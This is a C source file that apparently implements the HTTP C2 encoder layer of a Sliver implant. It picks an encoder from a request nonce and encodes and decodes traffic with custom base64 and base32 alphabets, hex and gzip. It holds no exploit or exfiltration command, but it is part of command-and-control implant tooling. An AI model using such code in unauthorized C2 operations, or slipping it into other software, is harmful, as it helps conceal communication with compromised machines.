/* src/crypto/encoders.c - Sliver's HTTP C2 encoder layer.
 *
 * The server picks an encoder from the request nonce:
 *   encoderID = nonce % 65537   (0 = passthrough; otherwise one of the ids the
 *                                server database assigned, see
 *                                server/encoders/encoders.go EncoderFromNonce)
 *
 * Those ids are per-database, so the build embeds them (config.encoders). The
 * alphabets below match util/encoders byte for byte:
 *   base64 "a0b2c5def6hijklmnopqr_st-uvwxyzA1B3C4DEFGHIJKLM7NO9PQR8ST+UVWXYZ", no pad
 *   base32 "ab1c2d3e4f5g6h7j8k9m0npqrtuvwxyz", no pad
 *   hex    lowercase
 *   gzip   gzip stream
 */
#include "sliver/crypto.h"
#include "sliver/config.h"

#include <stdlib.h>
#include <string.h>

#define SLIVER_ENCODER_MODULUS 65537u

static const char k_base64[] =
    "a0b2c5def6hijklmnopqr_st-uvwxyzA1B3C4DEFGHIJKLM7NO9PQR8ST+UVWXYZ";
static const char k_base32[] = "ab1c2d3e4f5g6h7j8k9m0npqrtuvwxyz";
static const char k_hex[] = "0123456789abcdef";

static const char *encoder_name(sliver_encoder_kind_t kind) {
  switch (kind) {
    case SLIVER_ENCODER_BASE64:
      return "base64";
    case SLIVER_ENCODER_BASE58:
      return "base58";
    case SLIVER_ENCODER_BASE32:
      return "base32";
    case SLIVER_ENCODER_HEX:
      return "hex";
    case SLIVER_ENCODER_ENGLISH:
      return "english";
    case SLIVER_ENCODER_GZIP:
      return "gzip";
    case SLIVER_ENCODER_PNG:
      return "png";
    default:
      return "nop";
  }
}

static int kind_from_id(unsigned long long id, sliver_encoder_kind_t *out) {
  if (out == NULL) {
    return -1;
  }
  if (id == 0) {
    *out = SLIVER_ENCODER_NOP;
    return 0;
  }
  if (id == sliver_config_encoder_id(SLIVER_ENCODER_BASE64)) {
    *out = SLIVER_ENCODER_BASE64;
    return 0;
  }
  if (id == sliver_config_encoder_id(SLIVER_ENCODER_BASE32)) {
    *out = SLIVER_ENCODER_BASE32;
    return 0;
  }
  if (id == sliver_config_encoder_id(SLIVER_ENCODER_HEX)) {
    *out = SLIVER_ENCODER_HEX;
    return 0;
  }
  if (id == sliver_config_encoder_id(SLIVER_ENCODER_GZIP)) {
    *out = SLIVER_ENCODER_GZIP;
    return 0;
  }
  if (id == sliver_config_encoder_id(SLIVER_ENCODER_BASE58)) {
    *out = SLIVER_ENCODER_BASE58;
    return 0;
  }
  if (id == sliver_config_encoder_id(SLIVER_ENCODER_ENGLISH)) {
    *out = SLIVER_ENCODER_ENGLISH;
    return 0;
  }
  if (id == sliver_config_encoder_id(SLIVER_ENCODER_PNG)) {
    *out = SLIVER_ENCODER_PNG;
    return 0;
  }
  return -1;
}

int sliver_encoder_from_nonce(unsigned long long nonce, sliver_encoder_kind_t *out,
                              unsigned long long *id_out) {
  unsigned long long id = nonce % SLIVER_ENCODER_MODULUS;
  if (out == NULL) {
    return -1;
  }
  if (kind_from_id(id, out) != 0) {
    /* An id we do not implement (traffic/wasm encoder or a stale id): the
     * request must not be sent, the server would fail to decode it. */
    return -1;
  }
  if (id_out != NULL) {
    *id_out = id;
  }
  return 0;
}

int sliver_encoder_pick_nonce(sliver_encoder_kind_t kind, unsigned long long *nonce) {
  unsigned long long id;
  unsigned long long salt;
  unsigned char rnd[8];

  if (nonce == NULL) {
    return -1;
  }
  id = sliver_config_encoder_id(kind);
  if (kind != SLIVER_ENCODER_NOP && id == 0) {
    return -1; /* the kind is not present in this build's configuration */
  }
  if (id >= SLIVER_ENCODER_MODULUS) {
    return -1;
  }
  if (sliver_random_bytes(rnd, sizeof(rnd)) != 0) {
    return -1;
  }
  memcpy(&salt, rnd, sizeof(salt));
  /* Keep the result inside the range the server accepts (encoders.MaxN) while
   * guaranteeing nonce % modulus == id. */
  salt = 1 + (salt % 1000u);
  *nonce = id + salt * SLIVER_ENCODER_MODULUS;
  return 0;
}

/* --- encode / decode ----------------------------------------------------- */
static int b64_encode(const void *data, size_t len, unsigned char **out, size_t *out_len) {
  const unsigned char *in = (const unsigned char *)data;
  size_t olen = ((len + 2) / 3) * 4;
  size_t i;
  size_t o = 0;
  unsigned char *buf;

  /* No padding: the final group is truncated to its significant characters. */
  if (len % 3 != 0) {
    olen -= 3 - (len % 3);
  }
  buf = (unsigned char *)malloc(olen == 0 ? 1 : olen);
  if (buf == NULL) {
    return -1;
  }
  for (i = 0; i + 2 < len; i += 3) {
    uint32_t v = ((uint32_t)in[i] << 16) | ((uint32_t)in[i + 1] << 8) | in[i + 2];
    buf[o++] = (unsigned char)k_base64[(v >> 18) & 63u];
    buf[o++] = (unsigned char)k_base64[(v >> 12) & 63u];
    buf[o++] = (unsigned char)k_base64[(v >> 6) & 63u];
    buf[o++] = (unsigned char)k_base64[v & 63u];
  }
  if (i < len) {
    uint32_t v = (uint32_t)in[i] << 16;
    if (i + 1 < len) {
      v |= (uint32_t)in[i + 1] << 8;
    }
    buf[o++] = (unsigned char)k_base64[(v >> 18) & 63u];
    buf[o++] = (unsigned char)k_base64[(v >> 12) & 63u];
    if (i + 1 < len) {
      buf[o++] = (unsigned char)k_base64[(v >> 6) & 63u];
    }
  }
  *out = buf;
  *out_len = o;
  return 0;
}

static int b32_encode(const void *data, size_t len, unsigned char **out, size_t *out_len) {
  const unsigned char *in = (const unsigned char *)data;
  size_t olen = (len * 8 + 4) / 5;
  unsigned char *buf = (unsigned char *)malloc(olen == 0 ? 1 : olen);
  size_t o = 0;
  uint32_t acc = 0;
  int bits = 0;
  size_t i;

  if (buf == NULL) {
    return -1;
  }
  for (i = 0; i < len; ++i) {
    acc = (acc << 8) | in[i];
    bits += 8;
    while (bits >= 5) {
      buf[o++] = (unsigned char)k_base32[(acc >> (bits - 5)) & 31u];
      bits -= 5;
    }
  }
  if (bits > 0) {
    buf[o++] = (unsigned char)k_base32[(acc << (5 - bits)) & 31u];
  }
  *out = buf;
  *out_len = o;
  return 0;
}

static int hex_encode(const void *data, size_t len, unsigned char **out, size_t *out_len) {
  const unsigned char *in = (const unsigned char *)data;
  unsigned char *buf = (unsigned char *)malloc(len * 2 + 1);
  size_t i;
  if (buf == NULL) {
    return -1;
  }
  for (i = 0; i < len; ++i) {
    buf[i * 2] = (unsigned char)k_hex[in[i] >> 4];
    buf[i * 2 + 1] = (unsigned char)k_hex[in[i] & 15u];
  }
  *out = buf;
  *out_len = len * 2;
  return 0;
}

int sliver_encoder_encode(sliver_encoder_kind_t kind, const void *data, size_t len,
                          unsigned char **out, size_t *out_len) {
  if (out == NULL || out_len == NULL) {
    return -1;
  }
  switch (kind) {
    case SLIVER_ENCODER_NOP:
      *out = (unsigned char *)malloc(len == 0 ? 1 : len);
      if (*out == NULL) {
        return -1;
      }
      if (len != 0) {
        memcpy(*out, data, len);
      }
      *out_len = len;
      return 0;
    case SLIVER_ENCODER_HEX:
      return hex_encode(data, len, out, out_len);
    case SLIVER_ENCODER_BASE64:
      return b64_encode(data, len, out, out_len);
    case SLIVER_ENCODER_BASE32:
      return b32_encode(data, len, out, out_len);
    case SLIVER_ENCODER_GZIP:
      return sliver_gzip_compress(data, len, out, out_len);
    default:
      return -1; /* base58, english and png are not implemented */
  }
}

static int b64_value(char c) {
  const char *p = strchr(k_base64, c);
  return p == NULL ? -1 : (int)(p - k_base64);
}

static int b32_value(char c) {
  const char *p = strchr(k_base32, c);
  return p == NULL ? -1 : (int)(p - k_base32);
}

int sliver_encoder_decode(sliver_encoder_kind_t kind, const void *data, size_t len,
                          unsigned char **out, size_t *out_len) {
  if (out == NULL || out_len == NULL) {
    return -1;
  }
  switch (kind) {
    case SLIVER_ENCODER_NOP:
      return sliver_encoder_encode(SLIVER_ENCODER_NOP, data, len, out, out_len);
    case SLIVER_ENCODER_GZIP:
      return sliver_gzip_decompress(data, len, out, out_len, 0);
    case SLIVER_ENCODER_HEX: {
      const unsigned char *in = (const unsigned char *)data;
      unsigned char *buf;
      size_t i;
      if (len % 2 != 0) {
        return -1;
      }
      buf = (unsigned char *)malloc(len / 2 + 1);
      if (buf == NULL) {
        return -1;
      }
      for (i = 0; i + 1 < len; i += 2) {
        int hi = strchr(k_hex, in[i]) ? (int)(strchr(k_hex, in[i]) - k_hex) : -1;
        int lo = strchr(k_hex, in[i + 1]) ? (int)(strchr(k_hex, in[i + 1]) - k_hex) : -1;
        if (hi < 0 || lo < 0) {
          free(buf);
          return -1;
        }
        buf[i / 2] = (unsigned char)((hi << 4) | lo);
      }
      *out = buf;
      *out_len = len / 2;
      return 0;
    }
    case SLIVER_ENCODER_BASE64: {
      const char *in = (const char *)data;
      unsigned char *buf = (unsigned char *)malloc((len * 3) / 4 + 3);
      size_t o = 0;
      uint32_t acc = 0;
      int bits = 0;
      size_t i;
      if (buf == NULL) {
        return -1;
      }
      for (i = 0; i < len; ++i) {
        int v = b64_value(in[i]);
        if (v < 0) {
          free(buf);
          return -1;
        }
        acc = (acc << 6) | (uint32_t)v;
        bits += 6;
        if (bits >= 8) {
          buf[o++] = (unsigned char)((acc >> (bits - 8)) & 0xFFu);
          bits -= 8;
        }
      }
      *out = buf;
      *out_len = o;
      return 0;
    }
    case SLIVER_ENCODER_BASE32: {
      const char *in = (const char *)data;
      unsigned char *buf = (unsigned char *)malloc((len * 5) / 8 + 2);
      size_t o = 0;
      uint32_t acc = 0;
      int bits = 0;
      size_t i;
      if (buf == NULL) {
        return -1;
      }
      for (i = 0; i < len; ++i) {
        int v = b32_value(in[i]);
        if (v < 0) {
          free(buf);
          return -1;
        }
        acc = (acc << 5) | (uint32_t)v;
        bits += 5;
        if (bits >= 8) {
          buf[o++] = (unsigned char)((acc >> (bits - 8)) & 0xFFu);
          bits -= 8;
        }
      }
      *out = buf;
      *out_len = o;
      return 0;
    }
    default:
      return -1;
  }
}

const char *sliver_encoder_kind_name(sliver_encoder_kind_t kind) {
  return encoder_name(kind);
}
